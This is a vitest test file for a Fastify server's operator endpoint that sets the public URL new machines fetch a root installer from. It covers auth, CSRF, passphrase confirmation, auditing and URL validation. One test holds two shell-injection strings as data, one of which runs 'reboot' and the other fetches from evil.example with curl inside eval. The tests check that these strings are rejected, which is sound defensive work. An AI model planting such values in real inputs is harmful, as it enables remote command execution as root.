import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { FastifyInstance } from 'fastify';
import { afterEach, describe, expect, test } from 'vitest';
import { createApp } from '../app.js';
import { listAudit } from '../auth/audit.js';
import { Backoff } from '../auth/backoff.js';
import { SetupMode, setOperatorPassphrase } from '../auth/operator.js';
import { loadBoot } from '../config/boot.js';
import { ConfigStore } from '../config/store.js';
import { fileModeServer, parseEditable } from '../config.js';
import { openDb } from '../db/open.js';
import { PLAIN_ORIGIN, SHARED_BACKOFF_HINT, type TailscaleDeps } from '../reach.js';
import { operatorSession, t0, tmpDbFile } from '../test/helpers.js';

const TOKEN = 'o'.repeat(32);
const HOST = '127.0.0.1:7420';
const URL_PATH = '/api/control/server/public-url';
const PASS = 'a long operator passphrase';

let app: FastifyInstance | undefined;
afterEach(async () => {
  await app?.close();
  app = undefined;
});

function world(
  o: {
    fetch?: (url: string, init: RequestInit) => Promise<Response>;
    tailscale?: TailscaleDeps;
    tls?: boolean;
  } = {},
) {
  const db = openDb(tmpDbFile());
  const dir = mkdtempSync(join(tmpdir(), 'jm-reach-'));
  const env = {
    JM_JOIN_TOKEN: 'join-secret-value-4',
    JM_OPERATOR_TOKEN: TOKEN,
    JM_DEV_IMAGES: '1',
    ...(o.tls ? { JM_TLS_TERMINATED: '1' } : {}),
  };
  const filePath = join(dir, 'jumpmaster.config.json');
  const store = ConfigStore.open({
    db,
    boot: loadBoot({ ...env, JM_DATA_DIR: dir }, filePath),
    filePath,
    env,
    now: () => t0,
    imageLockPath: join(dir, 'no-lock.json'),
  });
  const fetched: string[] = [];
  const a = createApp({
    db,
    config: store,
    forgesFor: () => {
      throw new Error('no forge');
    },
    now: () => t0,
    setup: new SetupMode(() => {}),
    backoff: new Backoff(),
    leaseWaitMs: 0,
    leasePollMs: 0,
    version: '1.2.3',
    reach: {
      fetch: async (url, init) => {
        fetched.push(url);
        return (o.fetch ?? (async () => Response.json({ ok: true, version: '1.2.3' })))(url, init);
      },
      tailscale: o.tailscale ?? { which: () => null, status: async () => null },
    },
  });
  app = a;
  const s = operatorSession(db, t0);
  return {
    db,
    store,
    fetched,
    inject: a.inject.bind(a),
    bearer: { host: HOST, authorization: `Bearer ${TOKEN}` },
    session: { host: HOST, cookie: s.cookie, 'x-jm-csrf': s.csrf },
    browser: { host: HOST, cookie: s.cookie },
  };
}

describe('GET /healthz', () => {
  test('answers without auth, on any Host, with exactly ok and version', async () => {
    const w = world();
    for (const host of [HOST, 'kidney.example.ts.net']) {
      const r = await w.inject({ method: 'GET', url: '/healthz', headers: { host } });
      expect(r.statusCode).toBe(200);
      expect(Object.keys(r.json()).sort()).toEqual(['ok', 'version']);
      expect(r.json()).toEqual({ ok: true, version: '1.2.3' });
    }
  });
});

describe('saving server.publicUrl', () => {
  test('without operator auth it is refused and nothing is stored or audited', async () => {
    const w = world();
    const payload = { publicUrl: 'https://a.b.ts.net' };
    const none = await w.inject({ method: 'PUT', url: URL_PATH, headers: { host: HOST }, payload });
    expect(none.statusCode).toBe(401);
    const wrong = await w.inject({
      method: 'PUT',
      url: URL_PATH,
      headers: { host: HOST, authorization: 'Bearer nope' },
      payload,
    });
    expect(wrong.statusCode).toBe(401);
    // A session without its CSRF header.
    const noCsrf = await w.inject({ method: 'PUT', url: URL_PATH, headers: w.browser, payload });
    expect(noCsrf.statusCode).toBe(403);
    expect(w.store.current().server).toBeUndefined();
    expect(listAudit(w.db)).toEqual([]);
  });

  test('with the token it is applied live and writes one server.public_url audit row', async () => {
    const w = world();
    const r = await w.inject({
      method: 'PUT',
      url: URL_PATH,
      headers: w.bearer,
      payload: { publicUrl: 'https://a.b.ts.net' },
    });
    expect(r.statusCode, r.body).toBe(200);
    expect(r.json()).toMatchObject({ publicUrl: 'https://a.b.ts.net', restartNeeded: [] });
    expect(w.store.current().server?.publicUrl).toBe('https://a.b.ts.net');
    const rows = listAudit(w.db);
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({
      action: 'server.public_url',
      via: 'token',
      detail: { publicUrl: 'https://a.b.ts.net' },
    });
  });

  // Issue #254 (D1): the address decides which script a new machine runs as root, so a session
  // without the passphrase cannot set, change or clear it; the guarded confirmation can.
  test('from a session it is held for the confirmation page, for a set, a change and a clear', async () => {
    const w = world();
    const say = 'New machines will download and run the installer from this address as root';
    const put = (publicUrl: string | null) =>
      w.inject({ method: 'PUT', url: URL_PATH, headers: w.session, payload: { publicUrl } });

    const set = await put('https://a.b.ts.net');
    expect(set.statusCode, set.body).toBe(409);
    expect(set.json()).toMatchObject({
      needsConfirmation: true,
      guarded: [{ path: 'server.publicUrl', consequence: `${say}: https://a.b.ts.net` }],
    });
    expect(set.json().confirm).toMatch(/^\/config\/confirm\//);
    expect(w.store.current().server).toBeUndefined();

    await w.inject({
      method: 'PUT',
      url: URL_PATH,
      headers: w.bearer,
      payload: { publicUrl: 'https://a.b.ts.net' },
    });
    const rev = w.store.revision();
    for (const value of ['https://evil.example', null]) {
      const r = await put(value);
      expect(r.statusCode, r.body).toBe(409);
      expect(r.json().needsConfirmation).toBe(true);
      expect(w.store.current().server?.publicUrl).toBe('https://a.b.ts.net');
      expect(w.store.revision()).toBe(rev);
    }
    // Only proposals are audited from the session; the one applied change is the token's.
    expect(
      listAudit(w.db)
        .reverse()
        .map((a) => [a.action, a.via]),
    ).toEqual([
      ['config.propose', 'session'],
      ['server.public_url', 'token'],
      ['config.propose', 'session'],
      ['config.propose', 'session'],
    ]);
  });

  test('confirmed with the passphrase it is applied, audited as server.public_url in the same shape', async () => {
    const w = world();
    await setOperatorPassphrase(w.db, PASS, t0);
    // Setting the passphrase ends every session: this one starts after it.
    const s = operatorSession(w.db, t0);
    const session = { host: HOST, cookie: s.cookie, 'x-jm-csrf': s.csrf };
    const browser = { host: HOST, cookie: s.cookie };
    // The token's row, the shape the confirmed one must keep.
    await w.inject({
      method: 'PUT',
      url: URL_PATH,
      headers: w.bearer,
      payload: { publicUrl: 'https://a.b.ts.net' },
    });
    const held = await w.inject({
      method: 'PUT',
      url: URL_PATH,
      headers: session,
      payload: { publicUrl: 'https://c.d.ts.net' },
    });
    expect(held.statusCode, held.body).toBe(409);
    const page = await w.inject({
      method: 'GET',
      url: held.json().confirm,
      headers: browser,
    });
    expect(page.statusCode).toBe(200);
    expect(page.body).toContain(
      'New machines will download and run the installer from this address as root',
    );
    const token = /name="token" value="([\w-]+)"/.exec(page.body)?.[1] as string;
    const done = await w.inject({
      method: 'POST',
      url: held.json().confirm,
      headers: {
        ...browser,
        origin: `http://${HOST}`,
        'content-type': 'application/x-www-form-urlencoded',
      },
      payload: new URLSearchParams({ token, passphrase: PASS }).toString(),
    });
    expect(done.statusCode, done.body).toBe(303);
    expect(done.headers.location).toBe('/system/server#other-machines');
    expect(w.store.current().server?.publicUrl).toBe('https://c.d.ts.net');
    const rows = listAudit(w.db)
      .reverse()
      .filter((a) => a.action === 'server.public_url');
    expect(rows.map((a) => [a.via, a.detail.publicUrl])).toEqual([
      ['token', 'https://a.b.ts.net'],
      ['session', 'https://c.d.ts.net'],
    ]);
    expect(Object.keys(rows[1]?.detail ?? {}).sort()).toEqual(
      Object.keys(rows[0]?.detail ?? {}).sort(),
    );
  });

  test('a token clear is applied at once', async () => {
    const w = world();
    for (const publicUrl of ['https://a.b.ts.net', null]) {
      const r = await w.inject({
        method: 'PUT',
        url: URL_PATH,
        headers: w.bearer,
        payload: { publicUrl },
      });
      expect(r.statusCode, r.body).toBe(200);
    }
    expect(w.store.current().server?.publicUrl).toBeUndefined();
  });

  test('an invalid address is refused with its rule, not stored, not audited', async () => {
    const w = world();
    for (const [url, rule] of [
      ['http://a.b', /https:\/\//],
      ['https://a.b/x', /no path/],
      ['https://a.b?q=1', /no query/],
      ['ftp://a', /https:\/\//],
    ] as const) {
      const r = await w.inject({
        method: 'PUT',
        url: URL_PATH,
        headers: w.bearer,
        payload: { publicUrl: url },
      });
      expect(r.statusCode).toBe(400);
      expect(r.json().issues[0].path).toBe('server.publicUrl');
      expect(r.json().issues[0].message).toMatch(rule);
    }
    expect(w.store.current().server).toBeUndefined();
    expect(listAudit(w.db)).toEqual([]);
  });
});

// Issue #254 (D5): every path that accepts the address refuses the same hostile values.
describe('a hostile address is refused by the config parse, the environment and the PUT', () => {
  const noLock = { imageLockPath: join(tmpdir(), 'jm-no-such-lock.json'), strict: true };
  test.each(['https://a.ts.net;reboot;', 'https://a.ts.net;{eval,"$({curl,-s,evil.example})"};x'])(
    '%s',
    async (hostile) => {
      const parsed = parseEditable({ server: { publicUrl: hostile } }, noLock);
      expect(parsed.ok).toBe(false);
      if (!parsed.ok)
        expect(parsed.issues).toEqual([{ path: 'server.publicUrl', message: PLAIN_ORIGIN }]);

      expect(() => fileModeServer(undefined, { JM_PUBLIC_URL: hostile })).toThrow(
        `JM_PUBLIC_URL: ${PLAIN_ORIGIN}`,
      );

      const w = world();
      const r = await w.inject({
        method: 'PUT',
        url: URL_PATH,
        headers: w.bearer,
        payload: { publicUrl: hostile },
      });
      expect(r.statusCode).toBe(400);
      expect(r.json().issues).toEqual([{ path: 'server.publicUrl', message: PLAIN_ORIGIN }]);
      expect(w.store.current().server).toBeUndefined();
      expect(listAudit(w.db)).toEqual([]);
    },
  );
});

describe('Check', () => {
  test('unset: refused with the words that say where to set it', async () => {
    const w = world();
    const r = await w.inject({ method: 'POST', url: `${URL_PATH}/check`, headers: w.bearer });
    expect(r.statusCode).toBe(409);
    expect(r.json().error).toContain('Set the address other machines reach this server at');
    expect(w.fetched).toEqual([]);
  });

  test('set: fetches <publicUrl>/healthz and reports reachable or the failure', async () => {
    const w = world({
      fetch: async () => new Response('', { status: 404, statusText: 'Not Found' }),
    });
    await w.inject({
      method: 'PUT',
      url: URL_PATH,
      headers: w.bearer,
      payload: { publicUrl: 'https://a.b.ts.net' },
    });
    const r = await w.inject({ method: 'POST', url: `${URL_PATH}/check`, headers: w.session });
    expect(r.statusCode).toBe(200);
    expect(r.json()).toEqual({
      ok: false,
      message: 'HTTP 404 Not Found from https://a.b.ts.net/healthz',
    });
    expect(w.fetched).toEqual(['https://a.b.ts.net/healthz']);
  });
});

describe('the Other machines section', () => {
  const page = async (w: ReturnType<typeof world>) =>
    (await w.inject({ method: 'GET', url: '/system/server', headers: w.browser })).body;

  test('without the tailscale CLI: no command, the general note', async () => {
    const w = world();
    const html = await page(w);
    expect(html).toContain('Other machines');
    expect(html).toContain('id="public-url"');
    expect(html).toContain('Check');
    expect(html).not.toContain('tailscale serve');
    expect(html).toContain('Put this server behind HTTPS on an address the new machine can reach');
  });

  test('with the CLI: the command on the real port, and the ts.net name without its dot', async () => {
    const w = world({
      tailscale: {
        which: () => '/usr/bin/tailscale',
        status: async () => JSON.stringify({ Self: { DNSName: 'kidney.example.ts.net.' } }),
      },
    });
    const html = await page(w);
    expect(html).toContain('tailscale serve --bg --https=443 http://127.0.0.1:7420');
    expect(html).toContain('https://kidney.example.ts.net');
    expect(html).not.toContain('kidney.example.ts.net.');
  });

  test('with an address set and no declared TLS terminator, it says sign-ins are counted together (issue #261)', async () => {
    expect(SHARED_BACKOFF_HINT).toBe(
      'Sign-in attempts from every machine are counted together. Set listen.tlsTerminated if a TLS terminator on this host fronts the server.',
    );
    const set = async (w: ReturnType<typeof world>) =>
      w.inject({
        method: 'PUT',
        url: URL_PATH,
        headers: w.bearer,
        payload: { publicUrl: 'https://a.b.ts.net' },
      });
    const plain = world();
    expect(await page(plain)).not.toContain(SHARED_BACKOFF_HINT);
    expect((await set(plain)).statusCode).toBe(200);
    expect(await page(plain)).toContain(SHARED_BACKOFF_HINT);
    await app?.close();
    const tls = world({ tls: true });
    expect((await set(tls)).statusCode).toBe(200);
    expect(await page(tls)).not.toContain(SHARED_BACKOFF_HINT);
  });

  test('the sticks page says where to set the address while it is unset, and shows it once set', async () => {
    const w = world();
    const before = (await w.inject({ method: 'GET', url: '/system/sticks', headers: w.browser }))
      .body;
    expect(before).toContain('Set the address other machines reach this server at');
    expect(before).toContain('href="/system/server#other-machines"');
    await w.inject({
      method: 'PUT',
      url: URL_PATH,
      headers: w.bearer,
      payload: { publicUrl: 'https://a.b.ts.net' },
    });
    const after = (await w.inject({ method: 'GET', url: '/system/sticks', headers: w.browser }))
      .body;
    expect(after).not.toContain('Set the address other machines reach this server at');
    expect(after).toContain('https://a.b.ts.net');
  });
});
